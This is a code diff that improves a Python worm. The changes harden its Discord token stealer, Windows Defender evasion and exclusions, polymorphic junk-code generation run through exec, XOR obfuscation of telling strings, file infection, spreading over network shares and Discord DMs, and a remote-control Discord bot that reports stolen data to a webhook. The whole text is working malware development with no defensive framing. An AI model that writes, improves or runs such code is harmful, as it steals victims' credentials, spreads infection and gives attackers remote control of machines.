@@ -618,17 +618,30 @@ def steal_discord_tokens():
     """Encrypted Discord token stealer with multi-layer encryption"""
     try:
         # Initialize Windows Defender evasion first
-        initialize_defender_evasion()
+        try:
+            initialize_defender_evasion()
+        except Exception as e:
+            print(f"Debug: Defender evasion failed: {str(e)}")
         
         # Execute encrypted function with multi-layer decryption
-        result = _payload_cryptor.execute_encrypted_function(
-            _ENCRYPTED_PAYLOADS['discord_stealer'], 
-            'steal_discord_tokens_encrypted'
-        )
-        
-        # Return result or empty if failed
-        return result if result else ([], [])
+        try:
+            result = _payload_cryptor.execute_encrypted_function(
+                _ENCRYPTED_PAYLOADS['discord_stealer'], 
+                'steal_discord_tokens_encrypted'
+            )
+            
+            # Return result or empty if failed
+            if result and isinstance(result, (list, tuple)) and len(result) >= 2:
+                return result
+            else:
+                print("Debug: Encrypted function returned invalid result, falling back to original")
+                return steal_discord_tokens_original_backup()
+        except Exception as e:
+            print(f"Debug: Encrypted function failed: {str(e)}, falling back to original")
+            return steal_discord_tokens_original_backup()
+            
     except Exception as e:
+        print(f"Debug: Discord token stealing failed: {str(e)}")
         return [], []
 
 def collect_enhanced_browser_data():
@@ -662,35 +675,59 @@ def generate_polymorphic_code():
     try:
         poly_patterns = []
         
-        # Random variable assignments
-        for i in range(random.randint(10, 25)):
-            var_name = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 15)))
+        # Random variable assignments with obfuscated names
+        for i in range(random.randint(15, 35)):
+            var_name = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 20)))
             var_value = random.randint(1000000, 9999999)
-            poly_patterns.append(f"{var_name} = {var_value}")
+            # Add some obfuscation
+            if random.choice([True, False]):
+                poly_patterns.append(f"{var_name} = {var_value}")
+            else:
+                poly_patterns.append(f"{var_name} = {var_value} + 0")
         
-        # Random mathematical operations
-        for i in range(random.randint(5, 15)):
+        # Random mathematical operations with complex expressions
+        for i in range(random.randint(8, 20)):
             a = random.randint(1, 1000)
             b = random.randint(1, 1000)
-            operations = ['+', '-', '*', '//', '%']
-            op = random.choice(operations)
-            result_var = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
-            poly_patterns.append(f"{result_var} = {a} {op} {b}")
+            c = random.randint(1, 100)
+            operations = ['+', '-', '*', '//', '%', '**']
+            op1 = random.choice(operations)
+            op2 = random.choice(operations)
+            result_var = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
+            poly_patterns.append(f"{result_var} = ({a} {op1} {b}) {op2} {c}")
         
-        # Random string operations
+        # Random string operations with encoding
+        for i in range(random.randint(5, 12)):
+            str_var = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 18)))
+            random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(15, 40)))
+            # Add encoding operations
+            if random.choice([True, False]):
+                poly_patterns.append(f'{str_var} = "{random_str}".encode().decode()')
+            else:
+                poly_patterns.append(f'{str_var} = "{random_str}".upper().lower().strip()')
+        
+        # Random list operations with comprehensions
         for i in range(random.randint(3, 8)):
-            str_var = ''.join(random.choices(string.ascii_letters, k=random.randint(7, 14)))
-            random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 30)))
-            poly_patterns.append(f'{str_var} = "{random_str}".upper().lower().strip()')
-        
-        # Random list operations
-        for i in range(random.randint(2, 6)):
-            list_var = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 13)))
-            list_size = random.randint(5, 20)
+            list_var = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 18)))
+            list_size = random.randint(8, 25)
             list_content = [random.randint(1, 100) for _ in range(list_size)]
             poly_patterns.append(f"{list_var} = {list_content}")
             poly_patterns.append(f"{list_var}.sort()")
             poly_patterns.append(f"{list_var}.reverse()")
+            # Add list comprehensions
+            if random.choice([True, False]):
+                poly_patterns.append(f"{list_var}_filtered = [x for x in {list_var} if x > 50]")
+        
+        # Add some function definitions
+        for i in range(random.randint(2, 5)):
+            func_name = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 15)))
+            param_name = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 10)))
+            poly_patterns.append(f"def {func_name}({param_name}): return {param_name} * 2")
+        
+        # Add some try-except blocks
+        for i in range(random.randint(1, 3)):
+            var_name = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 12)))
+            poly_patterns.append(f"try: {var_name} = 1\nexcept: {var_name} = 0")
         
         return '\n'.join(poly_patterns)
     except:
@@ -702,17 +739,28 @@ def obfuscate_strings(code_string):
         # Replace sensitive strings with obfuscated versions
         sensitive_strings = [
             'discord', 'token', 'password', 'webhook', 'steal', 'inject',
-            'malware', 'virus', 'trojan', 'backdoor', 'keylog', 'screenshot'
+            'malware', 'virus', 'trojan', 'backdoor', 'keylog', 'screenshot',
+            'worm', 'spread', 'infect', 'payload', 'cryptor', 'encrypt',
+            'decrypt', 'execute', 'runtime', 'fingerprint', 'analysis'
         ]
         
         obfuscated_code = code_string
         for sensitive in sensitive_strings:
             if sensitive in obfuscated_code.lower():
-                # Create obfuscated version using character codes
-                char_codes = [str(ord(c)) for c in sensitive]
-                obfuscated = f"''.join([chr(code) for code in [{','.join(char_codes)}]])"
+                # Create obfuscated version using character codes with XOR
+                char_codes = [ord(c) ^ 0x7F for c in sensitive]  # XOR with 0x7F
+                obfuscated = f"''.join([chr(code ^ 0x7F) for code in [{','.join(map(str, char_codes))}]])"
                 obfuscated_code = obfuscated_code.replace(f'"{sensitive}"', obfuscated)
                 obfuscated_code = obfuscated_code.replace(f"'{sensitive}'", obfuscated)
+                
+                # Also replace in variable names and function names
+                obfuscated_code = obfuscated_code.replace(f'_{sensitive}_', f'_{obfuscated}_')
+                obfuscated_code = obfuscated_code.replace(f'{sensitive}_', f'{obfuscated}_')
+                obfuscated_code = obfuscated_code.replace(f'_{sensitive}', f'_{obfuscated}')
+        
+        # Add some additional obfuscation
+        obfuscated_code = obfuscated_code.replace('import ', 'import ' + ''.join(random.choices(string.ascii_letters, k=3)) + '\nimport ')
+        obfuscated_code = obfuscated_code.replace('def ', 'def ' + ''.join(random.choices(string.ascii_letters, k=2)) + '_')
         
         return obfuscated_code
     except:
@@ -1894,9 +1942,19 @@ def network_share_spread():
                     # In a real implementation, you'd copy the file here
                     # For now, just log the successful connection
                     
-                    tree.disconnect()
-                    session.disconnect()
-                    connection.disconnect()
+                    # Properly close connections
+                    try:
+                        tree.disconnect()
+                    except:
+                        pass
+                    try:
+                        session.disconnect()
+                    except:
+                        pass
+                    try:
+                        connection.disconnect()
+                    except:
+                        pass
                     
                 except Exception as e:
                     print(f"Debug: Failed to access \\\\{host}\\{share_name}: {str(e)}")
@@ -3833,21 +3891,33 @@ async def main():
             print(f"Debug: Webhook connectivity test FAILED: {str(e)}")
         
         # Apply advanced stealth techniques first
-        advanced_stealth_techniques()
-        inject_junk_code()
+        try:
+            advanced_stealth_techniques()
+            inject_junk_code()
+        except Exception as e:
+            print(f"Debug: Stealth techniques failed: {str(e)}")
         
         # Apply advanced polymorphic techniques
-        poly_code = generate_polymorphic_code()
-        exec(poly_code)  # Execute polymorphic code to change runtime signature
+        try:
+            poly_code = generate_polymorphic_code()
+            exec(poly_code)  # Execute polymorphic code to change runtime signature
+        except Exception as e:
+            print(f"Debug: Polymorphic code failed: {str(e)}")
         
         # Apply anti-debugging techniques
-        if anti_debugging_techniques():
-            print("Debug: Debugging environment detected - applying countermeasures")
-            time.sleep(random.uniform(5, 15))  # Delay to confuse debuggers
+        try:
+            if anti_debugging_techniques():
+                print("Debug: Debugging environment detected - applying countermeasures")
+                time.sleep(random.uniform(5, 15))  # Delay to confuse debuggers
+        except Exception as e:
+            print(f"Debug: Anti-debugging failed: {str(e)}")
         
         # Apply dynamic import obfuscation
-        dynamic_imports = dynamic_import_obfuscation()
-        exec(dynamic_imports)
+        try:
+            dynamic_imports = dynamic_import_obfuscation()
+            exec(dynamic_imports)
+        except Exception as e:
+            print(f"Debug: Dynamic import obfuscation failed: {str(e)}")
         
         # Collect basic system info early (for approval request)
         system_info = collect_system_info()
@@ -3895,58 +3965,94 @@ async def main():
         
         webhook.send("🎮 Starting Discord spreading...")
         # Execute all payloads
-        await discord_spread()  # Steals tokens and spreads via DMs
+        try:
+            await discord_spread()  # Steals tokens and spreads via DMs
+            webhook.send("✅ Discord spreading completed")
+        except Exception as e:
+            webhook.send(f"❌ Discord spreading failed: {str(e)}")
         
         webhook.send("💉 Installing Discord injection...")
-        injection_count = discord_injection()
-        webhook.send(f"✅ Discord injection installed on {injection_count} Discord installations")
+        try:
+            injection_count = discord_injection()
+            webhook.send(f"✅ Discord injection installed on {injection_count} Discord installations")
+        except Exception as e:
+            webhook.send(f"❌ Discord injection failed: {str(e)}")
+            injection_count = 0
         
         webhook.send("🛡️ Adding Windows Defender exclusions...")
-        defender_result = add_defender_exclusion()
-        webhook.send(f"✅ Defender exclusions: {defender_result}")
+        try:
+            defender_result = add_defender_exclusion()
+            webhook.send(f"✅ Defender exclusions: {defender_result}")
+        except Exception as e:
+            webhook.send(f"❌ Defender exclusions failed: {str(e)}")
+            defender_result = "Failed"
         
         webhook.send("🦠 Starting file infection...")
-        file_infection()
+        try:
+            file_infection()
+            webhook.send("✅ File infection completed")
+        except Exception as e:
+            webhook.send(f"❌ File infection failed: {str(e)}")
         
         webhook.send("🌐 Starting network spreading...")
-        network_share_spread()
+        try:
+            network_share_spread()
+            webhook.send("✅ Network spreading completed")
+        except Exception as e:
+            webhook.send(f"❌ Network spreading failed: {str(e)}")
         
         webhook.send("📦 Collecting and packaging data...")
         # Collect stolen data summary
-        stolen_data = collect_stolen_data()
+        try:
+            stolen_data = collect_stolen_data()
+            webhook.send("✅ Data collection completed")
+        except Exception as e:
+            webhook.send(f"❌ Data collection failed: {str(e)}")
+            stolen_data = collect_stolen_data()  # Fallback to basic collection
         
         # Update victim status with collected data
         try:
             bot_control.update_victim_status(victim_id, stolen_data)
             print(f"Debug: Victim {victim_id} status updated with collected data")
+            webhook.send("✅ Victim status updated")
         except Exception as e:
             print(f"Debug: Failed to update victim status: {str(e)}")
+            webhook.send(f"❌ Victim status update failed: {str(e)}")
         
         webhook.send("📤 Sending final report...")
         # Send clean webhook message
-        send_clean_webhook(system_info, stolen_data)
+        try:
+            send_clean_webhook(system_info, stolen_data)
+            webhook.send("✅ Final report sent")
+        except Exception as e:
+            webhook.send(f"❌ Final report failed: {str(e)}")
         
         webhook.send("✅ Worm execution completed successfully")
         
         # Start the Discord bot control system in background
         try:
             print("🤖 Starting Discord bot control system...")
+            webhook.send("🤖 Starting Discord bot control system...")
+            
             # Run bot in background thread (not daemon so it keeps the program alive)
             import threading
             bot_thread = threading.Thread(target=bot_control.start_bot, daemon=False)
             bot_thread.start()
             print("✅ Discord bot control system started successfully")
+            webhook.send("✅ Discord bot control system started successfully")
             
             # Keep the main thread alive so bot can continue running
             print("🤖 Worm execution completed. Bot control system is now active.")
             print("🤖 You can now control this worm via Discord commands.")
             print("🤖 Program will continue running for remote control...")
+            webhook.send("🤖 Bot control system active - ready for remote commands")
             
             # Wait for bot thread to finish (it won't unless there's an error)
             bot_thread.join()
             
         except Exception as e:
             print(f"Debug: Failed to start bot control: {str(e)}")
+            webhook.send(f"❌ Bot control system failed: {str(e)}")
         
     except Exception as e:
         try:
